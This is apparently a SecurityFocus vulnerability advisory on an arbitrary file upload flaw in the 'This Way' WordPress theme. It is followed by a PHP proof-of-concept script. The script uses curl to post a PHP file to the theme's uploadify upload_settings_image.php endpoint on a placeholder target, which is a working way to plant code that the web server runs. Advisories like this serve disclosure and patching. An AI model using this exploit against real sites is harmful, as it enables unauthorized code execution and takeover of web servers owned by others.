source: http://www.securityfocus.com/bid/63523/info

The This Way Theme for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this issue to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access to the application; other attacks are also possible. 

<?php
$uploadfile="upl.php";
$ch = curl_init("http://[localcrot]/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php");
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS,
        array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
?>
